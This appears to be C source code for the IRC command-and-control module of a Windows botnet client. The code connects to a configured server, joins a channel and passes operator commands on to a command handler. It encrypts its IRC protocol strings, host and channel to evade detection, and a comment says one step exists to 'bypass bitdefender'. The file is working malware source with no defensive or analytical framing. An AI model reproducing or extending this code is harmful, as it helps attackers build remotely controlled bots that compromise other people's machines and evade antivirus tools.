#include "includes.h"
//#include "func.h"

#ifdef CRYPTO
char str_irc_join[] = "\x01\x01\x44\x69";
char str_irc_nick[] = "\x05\x07\x4E\x6C";
char str_irc_ping[] = "\x1B\x07\x43\x60";
char str_irc_user[] = "\x1E\x1D\x48\x75";
char str_irc_privmsg[] = "\x1B\x1C\x44\x71\xAC\x1D\x30";
#else
char str_irc_join[]		= "JOIN";
char str_irc_nick[]		= "NICK";
char str_irc_ping[]		= "PING";
char str_irc_user[]		= "USER";
char str_irc_privmsg[]	= "PRIVMSG";
#endif // CRYPTO

bool irc_start( void )
{
	//printf( "[+] irc_start() starting...\n" );

	SOCKET sIrcSocket = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	if ( sIrcSocket == INVALID_SOCKET ) 
	{
		//printf( "[-] irc_start() -> socket() fail: %d\n", WSAGetLastError() );
		return false;
	}

	SOCKADDR_IN sSin = {0};
	sSin.sin_family = AF_INET;
	sSin.sin_port = htons( nPort );
#ifdef CRYPTO
	u_char *dec_host = decrypt( cfg_host, size_host, crypt_key );
//	printf( "dec_host == \"%s\"\n", dec_host );

	sSin.sin_addr.s_addr = ResolveHost( (char *)dec_host );

	memset( dec_host, 0, sizeof(dec_host) );
#else
	sSin.sin_addr.s_addr = ResolveHost( cfg_host );
#endif // CRYPT

	if ( connect(sIrcSocket, (SOCKADDR *)&sSin, sizeof(sSin)) == SOCKET_ERROR )
	{
		//printf( "[-] irc_start() -> connect() fail: %d\n", WSAGetLastError() );
		closesocket( sIrcSocket );
		return false;
	}

	char szRecv[1024]="", szBotNick[32]="";

	for( int i = 0; i < 8; i++ )
		szBotNick[ i ] = "abcdefghijklmnopqrstuvwxyz"[ rand() % 26 ];

	//szBotNick[8] = 0;

	// bypass bitdefender
	irc_raw( sIrcSocket, "%s\r\n", szBotNick ); 

#ifdef CRYPTO
	u_char *dec_nick = decrypt( str_irc_nick, sizeof(str_irc_nick), crypt_key );
//	printf( "dec_nick == \"%s\"\n", dec_nick );

	irc_raw( sIrcSocket, "%s %s", dec_nick, szBotNick );

	memset( dec_nick, 0, sizeof(dec_nick) );
#else
	irc_raw( sIrcSocket, "NICK %s", szBotNick );
#endif // CRYPTO

	int Curbyte = 0;

	// nice code a59 ;D
	while ( recv(sIrcSocket, (char *)&szRecv[Curbyte], 1, 0) > 0 )
	{
		switch( szRecv[Curbyte] )
		{
		case 0x0D:
			szRecv[Curbyte] = 0;
			Curbyte++;
			break;

		case 0x0A:
			szRecv[Curbyte] = 0;
			irc_parse( sIrcSocket, szRecv, szBotNick );
			Curbyte = 0;
			break;

		default:
			Curbyte++;
			break;
		}
	}

	return true;
}

void irc_parse( SOCKET sSocket, char *pszLine, char *pszBotNick )
{
	if ( sSocket == INVALID_SOCKET ) return;

#ifdef DBG_LOG
	DbgPrintFile( "[*] irc_parse()\t<- \"%s\"", pszLine );
#endif // DBG_LOG

	char *paToken[32]={0};

	paToken[0] = strtok( pszLine, ": \r\n" );
	paToken[1] = strtok( NULL, " \r\n" );
	paToken[2] = strtok( NULL, " \r\n" );
	paToken[3] = strtok( NULL, ": \r\n" );

	for ( int i = 4; i < 32; i++ ) paToken[i] = strtok( NULL, " \r\n" );

	if ( !paToken[0] ) return;

#ifdef CRYPTO
	u_char *dec_ping = decrypt( str_irc_ping, sizeof(str_irc_ping), crypt_key );
//	printf( "dec_ping == \"%s\"\n", dec_ping );
	if ( !_stricmp(paToken[0], (char *)dec_ping ) )
	{
		memset( dec_ping, 0, sizeof(dec_ping) );
#else
	if ( !_stricmp(paToken[0], "PING") )
	{
#endif // CRYPTO
		paToken[0][1] = 'O'; // I got this little trick from omegabot by r-22
		irc_raw( sSocket, "%s %s", paToken[0], paToken[1] );
		return;
#ifdef CRYPTO
	}
	memset( dec_ping, 0, sizeof(dec_ping) ); // almost missed that one
#else
    }
#endif // CRYPTO

	if ( !paToken[1] ) return;

	switch ( atoi(paToken[1]) )
	{
	case 375: // RPL_MOTDSTART
	case 422: // ERR_NOMOTD
		{
#ifdef CRYPTO
			char szJoin[128]="";
			u_char *dec_join = decrypt( str_irc_join, sizeof(str_irc_join), crypt_key );
//			printf( "dec_join == \"%s\"\n", dec_join );
			sprintf( szJoin, "%s ", dec_join );
			memset( dec_join, 0, sizeof(dec_join) );

			u_char *dec_chan = decrypt( cfg_chan, size_chan, crypt_key );
//			printf( "dec_chan == \"%s\"\n", dec_chan );
			strcat( szJoin, (char *)dec_chan );
			memset( dec_chan, 0, sizeof(dec_chan) );

			irc_raw( sSocket, szJoin );
//			irc_raw( sSocket, "%s %s", dec_join, dec_chan );	
#else
			irc_raw( sSocket, "JOIN %s", cfg_chan );
#endif // CRYPTO

			return;
		}

	case 433: // ERR_NICKNAMEINUSE
		{
#ifdef CRYPTO
			u_char *dec_nick = decrypt( str_irc_nick, sizeof(str_irc_nick), crypt_key );
//			printf( "dec_nick == \"%s\"\n", dec_nick );

			irc_raw( sSocket, "%s %s", dec_nick, pszBotNick );

			memset( dec_nick, 0, sizeof(dec_nick) );
#else
			irc_raw( sSocket, "NICK %s", pszBotNick );
#endif // CRYPTO
			return;
		}
    case 451: // ERR_NOTREGISTERED
		{
#ifdef CRYPTO
			u_char *dec_user = decrypt( str_irc_user, sizeof(str_irc_user), crypt_key );
//			printf( "dec_user == \"%s\"\n", dec_user );

			irc_raw( sSocket, "%s %s * * :%s", dec_user, pszBotNick, pszBotNick );

			memset( dec_user, 0, sizeof(dec_user) );
#else
			irc_raw( sSocket, "USER %s * * :%s", pszBotNick, pszBotNick );
#endif // CRYPTO
			return;
		}
    }

	if ( !paToken[3] ) return;

	int x = 3;

	// for single bot commands: botsnick .command
	if ( !strcmp(paToken[3], pszBotNick) ) x = 4;

	if ( paToken[x][0] != cPrefix ) 
		return;
	else // this removes the prefix from the first command token
		paToken[x] = str_sub( paToken[x], 1, strlen(paToken[x]) );

	commands( sSocket, x, paToken );
}

int irc_raw( SOCKET sSocket, char *pszPacket, ... )
{
	char szSend[256]="";

	va_list va = {0};
	va_start( va, pszPacket );
	_vsnprintf( szSend, sizeof(szSend)-4, pszPacket, va );
	va_end( va );

	strncat( szSend, "\r\n", 2 );

//	if ( !szSend[strlen(szSend)+1] ) printf( "[?] irc_raw() phew...\n" );

	int iRet = send( sSocket, szSend, strlen(szSend), 0 );

#ifdef DBG_LOG
	if ( iRet > 0 ) 
	{
		str_rmnl( szSend );
		DbgPrintFile( "[+] irc_raw()\t-> \"%s\"", szSend );
	}
#endif // DBG_LOG

	return iRet;    
}

int irc_msg( SOCKET sock, char *pszFmt, ... )
{
	char szBuf[256]="", szSend[256]="";

	// strlen of the crypted chan will be longer I think but whatever
	int nLen = strlen(cfg_chan) + 14;

	va_list va={0};
	va_start( va, pszFmt );
	_vsnprintf( szBuf, sizeof(szBuf)-nLen, pszFmt, va );
	va_end( va );

#ifdef CRYPTO
	char szPrivmsg[128]="";

	u_char *dec_pm = decrypt( str_irc_privmsg, sizeof(str_irc_privmsg), crypt_key );
//	printf( "dec_pm == \"%s\"\n", dec_pm );
	sprintf( szPrivmsg, "%s ", dec_pm );
	memset( dec_pm, 0, sizeof(dec_pm) );

	u_char *dec_chan = decrypt( cfg_chan, size_chan, crypt_key );
//	printf( "dec_chan == \"%s\"\n", dec_chan );
	strcat( szPrivmsg, (char *)dec_chan );
	memset( dec_chan, 0, sizeof(dec_chan) );

	_snprintf( szSend, sizeof(szSend)-1, 
		"%s :%s\r\n", szPrivmsg, szBuf );
#else
	_snprintf( szSend, sizeof(szSend)-1, 
		"PRIVMSG %s :%s\r\n", cfg_chan, szBuf );
#endif // CRYPTO

//	if ( !szSend[strlen(szSend)+1] ) printf( "[?] irc_raw() phew...\n" );

	int iRet = send( sock, szSend, strlen(szSend), 0 );

#ifdef DBG_LOG
	if ( iRet > 0 )
	{
		str_rmnl( szSend );
		DbgPrintFile( "[+] irc_msg()\t-> \"%s\"", szSend );
	}
#endif // DBG_LOG

	return iRet;
}